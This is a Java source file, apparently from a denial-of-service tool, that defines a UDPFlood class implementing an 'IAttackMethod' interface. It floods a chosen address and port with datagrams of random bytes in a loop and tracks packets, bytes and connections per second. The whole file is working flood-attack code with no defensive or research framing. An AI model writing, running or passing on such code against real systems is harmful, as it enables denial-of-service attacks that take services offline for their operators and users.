package ir.xenoncommunity.jss.methods.impl;

import ir.xenoncommunity.jss.methods.IAttackMethod;
import ir.xenoncommunity.jss.utils.AttackStatics;
import ir.xenoncommunity.jss.utils.Randomize;
import ir.xenoncommunity.jss.utils.SocketUtils;
import lombok.RequiredArgsConstructor;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;


@RequiredArgsConstructor
public class UDPFlood implements IAttackMethod {
    private static DatagramSocket socket;

    static {
        try {
            socket = new DatagramSocket();
        } catch (SocketException e) {
            e.printStackTrace(System.err);
        }

        SocketUtils.setSoTimeout(socket, 1000);
    }

    private final AttackStatics statics;
    private final int maxBytesSize;

    /**
     * Send datagrams to the specified address and port.
     *
     * @param addr the destination InetAddress
     * @param port the destination port
     * @throws Exception if an error occurs during the send operation
     */
    @Override
    public void send(final InetAddress addr, final int port) throws Exception {
        // Check if the limit is reached before sending
        if (statics.isLimitReached()) return;

        statics.cps(); // update connection per second statistics

        System.out.println(socket.isConnected());
        // continuously send data as long as the socket is connected and the limit is not reached
        while (!statics.isLimitReached() && statics.isRunning()) {
            statics.bps(maxBytesSize);  // update bytes per second statistics
            statics.pps();  // update packets per second statistics

            // Create a datagram packet with random bytes and send it
            DatagramPacket packet = new DatagramPacket(Randomize.randomBytes(maxBytesSize), maxBytesSize, addr, port);
            socket.send(packet);
        }
    }

}
